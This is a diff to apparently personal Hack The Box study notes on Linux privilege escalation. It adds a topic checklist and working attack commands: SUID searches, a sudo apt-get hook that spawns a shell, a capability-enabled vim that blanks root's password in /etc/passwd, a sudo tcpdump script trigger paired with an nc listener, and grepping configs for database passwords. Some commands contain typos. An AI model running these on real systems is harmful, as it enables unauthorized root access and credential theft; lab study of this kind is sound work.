@@ -2,6 +2,37 @@
 
 <!-- /bin /boot /dev /etc /lib /media /mnt /opt /home /var /usr /tmp /sys /proc /root /run -->
 
+<!-- TODO:
+- [ ] read LPE 5 Path Abuse 
+- [ ] read LPE 6 Wildcard Abuse
+- [ ] read LPE 7 Escaping Restricted Shells
+- [ ] read LPE 8 Special Permissions
+- [ ] read LPE 9 Sudo Rights Abuse
+- [ ] read LPE 10 Privelged Groups
+- [ ] read LPE 11 Capabilities
+- [ ] read LPE 12 Vulnerable Services
+- [ ] read LPE 13 Cron Jobs Abuse
+- [ ] read LPE 14 LXD
+- [ ] read LPE 15 Docker
+- [ ] read LPE 16 
+- [ ] read LPE 17 Kubernetes
+- [ ] read LPE 18 Logrotate
+- [ ] read LPE 19 Miscelaneous Techniques
+- [ ] read LPE 20 Kernel Exploits
+- [ ] read LPE 21 Shared Libs
+- [ ] read LPE 22 Shared Object Hijacking
+- [ ] read LPE 23 Python Library Hijacking
+- [ ] read LPE 24 Sudo
+- [ ] read LPE 25 Polkit
+- [ ] read LPE 26 Dirty Pipe
+- [ ] read LPE 27 Netfilter
+- [ ] read LPE 28 Linux Hardening
+-->
+
+
+
+-->
+
 ```bash
 smbclient -L SERVER_IP -U htb-student
 smbclient '\\SERVER_IP\Company Data' -U htb-student
@@ -45,13 +76,31 @@ pwd && conncheck
 # touch ls
 # echo 'echo "PATH ABUSE!!!"' > ls
 # chmod +x ls
-# lss
+# ls
 env
 cat /etc/fstab
 route 
 arp -a
 lastlog
 w
+
+find / -use root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
+find / -use root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
+sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
+
+sudo setcap capt_net_bind_service==+ep /usr/bin/vim.basic
+find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
+getcap /usr/bin/vim.basic
+cat /etc/passwd | head -n1
+/usr/bin/vim.basic /etc/passwd
+# root:x:0:0:root:/root:/bin/bash
+echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
+cat /etc/passwd | head -n1
+# root::0:0:root:/root:/bin/bash
+
+sudo tcpdump -ln -i etho -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
+sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
+nc -lnvp 443
 
 cat wp-config.php | grep 'DB_USER\|DB_PASSWORD'
 find / ! -path "*.proc/*" -iname "*config" -type f 2>/dev/null
